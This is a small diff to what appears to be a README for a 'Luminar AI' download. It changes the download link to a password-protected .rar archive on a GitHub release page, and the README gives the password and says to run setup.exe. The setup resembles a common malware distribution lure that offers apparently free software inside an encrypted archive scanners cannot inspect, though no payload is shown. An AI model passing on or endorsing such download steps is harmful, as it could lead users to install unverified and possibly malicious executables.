@@ -2,7 +2,7 @@
 
 <H3>How to use</H3>
 
-- [Download](https://github.com/Poo121we/luminar-ai/releases/download/download/Luminar.rar)
+- [Download](https://github.com/Poo121we/luminar-ai/releases/download/Download/Luminar.rar)
 - Open archive (password: luminar)
 - Open setup.exe for install
 - Follow the instruction
